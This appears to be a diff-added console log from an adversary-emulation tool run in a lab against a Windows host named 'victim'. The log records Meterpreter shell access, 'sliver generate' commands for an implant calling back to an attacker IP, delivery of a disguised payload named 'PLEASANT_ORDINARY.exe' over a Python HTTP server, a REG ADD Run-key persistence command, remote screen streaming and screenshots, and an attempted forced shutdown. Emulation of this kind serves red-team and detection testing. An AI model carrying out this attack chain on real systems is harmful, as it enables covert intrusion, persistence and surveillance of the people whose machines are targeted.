+  Description: Target file path
+➤ Enter value for FilePath (default: , required: True): C:\Users\victim\Downloads\hello.txt
+
+📌[Meterpreter Executor] Step 10 Parameter Input
+  Parameter: Algorithm
+  Description: Hash algorithm (md5/sha1)
+➤ Enter value for Algorithm (default: , required: True): sha1
+
+[Meterpreter Executor] Executing: checksum
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823174012414125
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125]
+0b156215b189103c3d268f61299a854cd0b31e70  C:\Users\victim\Downloads\hello.txt
+
+
+📌[Meterpreter Executor] Step 11
+
+📌[Name] Interactive Shell Access (Windows)
+ Parameter Input
+  Parameter: ParentExecutorID
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: shell
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823186179058365
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365]
+Process 3876 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.19045.6456]
+(c) Microsoft Corporation????????
+
+C:\Users\victim\Downloads>
+
+📌[Sliver Console] Step 12
+
+📌[Name] Build the executable file (service) of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (default: None, required: True): 7777
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (default: None, required: True): sliver_save
+[MANUAL ACTION REQUIRED]
+    sliver > generate --mtls 192.168.56.101:7777 --os windows --arch 64bit --format service --save sliver_save
+    sliver > mtls --lport 7777
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Human] Step 13
+
+📌[Name] Simulate the victim download a file on its machine
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (default: None, required: True): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the file on the attacker's machine
+    3. Download the file to C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[Command Prompt Executor] Step 14
+
+📌[Name] Reg Key Run
+ Parameter Input
+  Parameter: Executor
+  Description: The executor for this action
+  ✓ Using stored value: 1
+ Parameter Input
+  Parameter: command_to_execute
+  Description: Thing to Run
+  ✓ Using stored value: C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823271585037902
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365, 1772823271585037902]
+
+[FINISHED] Command completed!😊
+
+📌[None] Step 15
+
+📌[Name] Obtain a persistent Sliver Executor
+
+📌[Human] Step 16
+
+📌[Name] Simulate the victim download and execute malicious payload file as Admin (Root)
+ Parameter Input
+  Parameter: HOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for HOST (default: None, required: False): 192.168.56.101
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (default: 8000, required: False): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (default: None, required: True): C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server 8000
+
+    (On victim's machine)
+    1. Open 192.168.56.101:8000 in the browser
+    2. Navigate to the path of the target payload file
+    3. Download the payload file
+    4. Execute the payload file to C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe as Admin (Root)
+
+    
+Keep going with the next attack step? [y/n]: y
+
+📌[None] Step 17
+
+📌[Name] Execute a Meterpreter Payload
+
+📌[Meterpreter Executor] Step 18
+
+📌[Name] Remote Screen Capture
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+📌[Meterpreter Executor] Step 18 Parameter Input
+  Parameter: quality
+  Description: Image quality percentage (1-100)
+➤ Enter value for quality (default: , required: True): 100
+
+[Meterpreter Executor] Executing: screenshare
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823311398286749
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365, 1772823271585037902, 1772823311398286749]
+
+C:\Users\victim\Downloads>    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe"
+The operation completed successfully.
+
+C:\Users\victim\Downloads>    
+C:\Users\victim\Downloads>
+C:\Users\victim\Downloads>[*] Preparing player...
+[*] Opening player at: /home/kali/Desktop/Aurora-executor-demo/NUhZtnfv.html
+[*] Streaming...
+
+C:\Users\victim\Downloads>    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Users\victim\Downloads\PLEASANT_ORDINARY.exe"
+The operation completed successfully.
+
+C:\Users\victim\Downloads>    
+C:\Users\victim\Downloads>
+C:\Users\victim\Downloads>[*] Preparing player...
+[*] Opening player at: /home/kali/Desktop/Aurora-executor-demo/NUhZtnfv.html
+[*] Streaming...
+
+
+📌[Sliver Executor] Step 19
+
+📌[Name] Take Screenshot
+ Parameter Input
+  Parameter: Executor
+  Description: The session ID of the active Sliver connection.
+  Select from available Sliver sessions:
+Available Sessions:
+[0] a0ae8dd1-a50a-468a-849a-e2713f06e299 - PLEASANT_ORDINARY@WIN10-basic-tar (windows)
+Select session number: 0
+
+[Sliver Executor] Executing: screenshot
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823317523069580
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365, 1772823271585037902, 1772823311398286749, 1772823317523069580]
+Screenshot saved to /home/kali/Downloads/screenshot_20260306125512.png
+
+📌[Meterpreter Executor] Step 20
+
+📌[Name] Capture Screen Image
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: screenshot
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823320176610062
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365, 1772823271585037902, 1772823311398286749, 1772823317523069580, 
+1772823320176610062]
+Screenshot saved to: /home/kali/Desktop/Aurora-executor-demo/GKZdDmCB.jpeg
+
+
+📌[Meterpreter Executor] Step 21
+
+📌[Name] Force System Shutdown
+ Parameter Input
+  Parameter: Executor
+  Description: The Meterpreter session ID of the active Metasploit connection
+  ✓ Using stored value: 1
+
+[Meterpreter Executor] Executing: shutdown
+Keep going with the next attack step? [y/n]: y
+[Command execution at] 1772823330949271390
+[All timestamps] [1772822901806968387, 1772822904262664875, 1772823039187858254, 1772823047722843470, 1772823073926701913, 1772823098204312142, 
+1772823110203706212, 1772823129488281631, 1772823174012414125, 1772823186179058365, 1772823271585037902, 1772823311398286749, 1772823317523069580, 
+1772823320176610062, 1772823330949271390]
+Command execute failure: 'data'
